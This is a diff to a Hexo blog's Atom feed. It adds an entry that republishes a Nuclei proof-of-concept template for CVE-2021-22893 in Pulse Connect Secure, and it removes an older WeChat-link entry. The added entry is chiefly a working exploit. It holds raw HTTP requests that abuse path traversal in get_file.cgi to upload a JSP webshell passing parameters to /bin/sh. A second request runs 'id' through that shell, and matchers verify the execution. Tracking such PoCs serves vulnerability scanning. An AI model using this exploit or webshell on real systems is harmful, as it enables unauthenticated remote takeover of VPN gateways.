@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-15T01:15:13.443Z</updated>
+  <updated>2025-06-15T02:00:15.821Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,32 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Pulse Connect Secure Remote Code Execution Vulnerability</title>
+    <link href="http://example.com/2025/06/15/github_3296301683/"/>
+    <id>http://example.com/2025/06/15/github_3296301683/</id>
+    <published>2025-06-15T02:00:15.823Z</published>
+    <updated>2025-06-15T02:00:15.821Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> Pulse Connect Secure Remote Code Execution Vulnerability</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2021-22893</li></ul><p><strong>漏洞类型：</strong> 命令执行</p><p><strong>漏洞等级：</strong> 严重</p><p><strong>漏洞描述：</strong> Pulse Connect Secure 9.1R11.4及以下版本存在未认证的远程代码执行漏洞。攻击者可以利用路径遍历漏洞写入任意文件，通过上传webshell导致远程代码执行。此漏洞允许攻击者在受影响的系统上执行任意命令，严重威胁系统安全。</p><p><strong>产品厂商：</strong> Pulse Secure</p><p><strong>产品名称：</strong> Pulse Connect Secure</p><p><strong>影响版本：</strong> version &lt;&#x3D; 9.1R11.4</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/44dc91ac6ae0df9a0866bbef4d8dbcbc1972d5dc/http%2Fcves%2F2021%2FCVE-2021-22893.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/44dc91ac6ae0df9a0866bbef4d8dbcbc1972d5dc/http%2Fcves%2F2021%2FCVE-2021-22893.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> cve-<span class="hljs-number">202</span>1-<span class="hljs-number">2289</span>3-pulse-secure-rce<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> Pulse Connect Secure <span class="hljs-operator">-</span> Remote Code Execution (CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">22893</span>)<br>  <span class="hljs-params">author:</span> MammaniNelsonD (P4IM0N)<br>  <span class="hljs-params">severity:</span> critical<br>  <span class="hljs-params">description:</span> |<br>    Pulse Connect Secure <span class="hljs-number">9.1</span>R11.<span class="hljs-number">4</span> y versiones inferiores son vulnerables a una ejecución de código remota no autenticada.<br>    Un atacante puede aprovechar una vulnerabilidad de Path Traversal para escribir archivos arbitrarios, lo que conduce a RCE al cargar una webshell.<br>    Esta plantilla intenta escribir una webshell JSP, ejecutar un cálculo matemático y el comando &#x27;id&#x27;, y verificar ambos resultados para confirmar el RCE.<br>  <span class="hljs-params">reference:</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44784</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//nvd.nist.gov/vuln/detail/CVE-2021-22893</span><br>    <span class="hljs-operator">-</span> https:<span class="hljs-symbol">//attackerkb.com/topics/23p4wVqVad/cve-2021-22893/rapid7-analysis</span><br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.1</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:U<span class="hljs-operator">/</span>C:H<span class="hljs-operator">/</span>I:H<span class="hljs-operator">/</span>A:H<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">9.8</span><br>    <span class="hljs-params">cve-id:</span> CVE-<span class="hljs-number">202</span>1-<span class="hljs-number">22893</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">22</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-requests:</span> <span class="hljs-number">8</span><br>  <span class="hljs-params">tags:</span> cve,cve2021,pulse,rce,traversal,unauth,webshell,intrusive<br><br><span class="hljs-params">requests:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-operator">/</span>dana-na<span class="hljs-operator">/</span>jam<span class="hljs-operator">/</span>get_file.cgi<span class="hljs-operator">?</span>pass<span class="hljs-operator">=</span><span class="hljs-number">1</span>&amp;file_name<span class="hljs-operator">=</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..<span class="hljs-operator">/</span>..&#123;&#123;web_path&#125;&#125;&#123;&#123;shell_name&#125;&#125;&amp;v<span class="hljs-operator">=</span><span class="hljs-number">2.4</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">User-Agent:</span> Mozilla<span class="hljs-symbol">/5.0</span> (Windows NT <span class="hljs-number">10.0</span>; Win64; x64)<br>        <span class="hljs-params">Accept:</span> <span class="hljs-operator">*</span><span class="hljs-comment">/*</span><br><span class="hljs-comment">        Connection: close</span><br><span class="hljs-comment">        Content-Type: application/octet-stream</span><br><span class="hljs-comment">        Content-Length: &#123;&#123;len(webshell_body)&#125;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        &#123;&#123;webshell_body&#125;&#125;</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">      - |</span><br><span class="hljs-comment">        GET &#123;&#123;web_path&#125;&#125;&#123;&#123;shell_name&#125;&#125;?cmd=printf%20%27%25s%5Cn%27%20%24%28%283%2A1336%2A0x4242AAAAAAA%29%29%3B%20id HTTP/1.1</span><br><span class="hljs-comment">        Host: &#123;&#123;Hostname&#125;&#125;</span><br><span class="hljs-comment">        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)</span><br><span class="hljs-comment">        Accept: */</span><span class="hljs-operator">*</span><br>        <span class="hljs-params">Connection:</span> close<br><br>    <span class="hljs-params">attack:</span> clusterbomb<br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">web_path:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/dana/html5acc/guacamole/ui/&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/dana-na/help/&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/dana-cached/help/&quot;</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;/dana/meeting/&quot;</span><br>      <span class="hljs-params">shell_name:</span><br>        <span class="hljs-operator">-</span> <span class="hljs-string">&quot;&#123;&#123;randstr&#125;&#125;.jsp&quot;</span><br>      <span class="hljs-params">webshell_body:</span><br>        <span class="hljs-operator">-</span> &#x27;<span class="hljs-operator">&lt;</span>%@page <span class="hljs-built_in">import</span><span class="hljs-operator">=</span><span class="hljs-string">&quot;java.util.*,java.io.*&quot;</span>%<span class="hljs-operator">&gt;</span><span class="hljs-operator">&lt;</span>% <span class="hljs-keyword">if</span> (request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>) <span class="hljs-operator">!=</span> <span class="hljs-literal">null</span>) &#123; Process p <span class="hljs-operator">=</span> Runtime.getRuntime().exec(new String[]&#123;<span class="hljs-string">&quot;/bin/sh&quot;</span>, <span class="hljs-string">&quot;-c&quot;</span>, request.getParameter(<span class="hljs-string">&quot;cmd&quot;</span>)&#125;); DataInputStream dis <span class="hljs-operator">=</span> new DataInputStream(p.getInputStream()); String line; while ((line <span class="hljs-operator">=</span> dis.readLine()) <span class="hljs-operator">!=</span> <span class="hljs-literal">null</span>) &#123; out.println(line); &#125; p.destroy(); &#125;%<span class="hljs-operator">&gt;</span>&#x27;<br><br>    <span class="hljs-params">stop-at-first-match:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">req-condition:</span> <span class="hljs-literal">true</span><br>    <span class="hljs-params">matchers-condition:</span> and<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> status<br>        <span class="hljs-params">status:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-number">200</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> word<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">words:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;18249951695861136&quot;</span><br><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;uid=([0-9]+).*gid=([0-9]+)&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; Pulse Connect Secure Remote Code Execut</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="命令执行" scheme="http://example.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
+    
+  </entry>
   
   <entry>
     <title>Grafana 远程代码执行漏洞</title>
@@ -511,33 +537,6 @@
       
     <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 网安独行侠&lt;/p&gt;
 &lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/zqnUe-t6_CHF182lVIQYFA&quot;&gt;https://mp.weixin.qq.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="网安独行侠" scheme="http://example.com/tags/%E7%BD%91%E5%AE%89%E7%8B%AC%E8%A1%8C%E4%BE%A0/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>《How Can I Save Him》和童年的自己对话</title>
-    <link href="http://example.com/2025/06/14/weixin_1434409577/"/>
-    <id>http://example.com/2025/06/14/weixin_1434409577/</id>
-    <published>2025-06-14T14:30:48.523Z</published>
-    <updated>2025-06-14T14:30:48.521Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 网安独行侠</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/xZXFDE09U2v7yaqzFDzZbg">https://mp.weixin.qq.com/s/xZXFDE09U2v7yaqzFDzZbg</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 网安独行侠&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/xZXFDE09U2v7yaqzFDzZbg&quot;&gt;https://mp.weixin.qq.</summary>
       
     
     
